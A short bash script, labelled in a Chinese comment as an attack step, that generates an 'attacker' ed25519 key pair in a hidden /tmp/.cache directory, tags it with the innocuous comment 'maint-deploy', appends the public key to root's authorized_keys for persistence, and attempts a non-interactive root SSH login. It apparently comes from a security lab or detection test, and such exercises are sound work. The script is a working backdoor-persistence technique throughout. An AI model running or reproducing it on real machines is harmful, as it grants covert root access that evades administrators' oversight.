#!/usr/bin/env bash
# attack（窗口内）：生成攻击者密钥对、追加公钥驻留、尝试密钥登入。
set -euo pipefail
ssh-keygen -q -t ed25519 -N '' -f /tmp/.cache/atk_ed25519 -C maint-deploy 2>/dev/null
mkdir -p /root/.ssh; chmod 700 /root/.ssh
cat /tmp/.cache/atk_ed25519.pub >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /tmp/.cache/atk_ed25519 root@127.0.0.1 true 2> /tmp/.cache/ssh-attempt.txt || true
